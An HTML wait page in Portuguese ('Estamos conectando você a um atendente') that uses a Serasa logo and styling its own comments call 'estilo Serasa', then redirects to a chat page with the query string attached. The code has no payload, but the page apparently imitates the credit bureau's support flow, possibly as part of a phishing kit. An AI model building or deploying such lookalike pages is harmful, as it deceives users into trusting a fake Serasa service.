    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aguarde Atendimento</title>
    <style>
        /* Reset básico */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Arial', sans-serif;
        }

        body {
            background-color: #E80070; /* Azul escuro estilo Serasa */
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            text-align: center;
        }

        .logo {
            width: 120px;
            margin-bottom: 30px;
        }

        h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }

        p {
            font-size: 18px;
            margin-bottom: 40px;
        }

        
        .spinner {
            border: 6px solid rgba(255,255,255,0.2);
            border-top: 6px solid #fff;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg);}
            100% { transform: rotate(360deg);}
        }

        /* Botão de ajuda opcional */
        .help-btn {
            background-color: #ffca00;
            color: #0b3d91;
            border: none;
            padding: 12px 25px;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
            text-decoration: none;
        }

        .help-btn:hover {
            background-color: #e6b800;
        }

        /* Pequeno detalhe animado estilo Serasa */
        .dots span {
            display: inline-block;
            width: 10px;
            height: 10px;
            margin: 0 5px;
            background-color: #fff;
            border-radius: 50%;
            animation: bounce 1.2s infinite;
        }

        .dots span:nth-child(2) {
            animation-delay: 0.2s;
        }

        .dots span:nth-child(3) {
            animation-delay: 0.4s;
        }

        @keyframes bounce {
            0%, 80%, 100% { transform: scale(0);}
            40% { transform: scale(1);}
        }
    </style>
</head>
<body>

    
    <img src="./img/serasa-white.svg" alt="Logo" class="logo">

    <h1 id="msg">Estamos conectando você a um atendente</h1>
    <p id="please">Por favor, aguarde alguns instantes</p>

    
    <div class="spinner"></div>

   
<script>

    
    const currentParams = window.location.search; 
    const please = document.getElementById('please');
    const msg = document.getElementById('msg');

    setTimeout(() => {
        please.style.display = 'none'
        msg.innerHTML = "Inciciando atendimento!"
    }, 4000);
    
    setTimeout(function() {
        window.location.href = `./chat.html${currentParams}`;
    }, 6000);
</script>



</body>
</html>
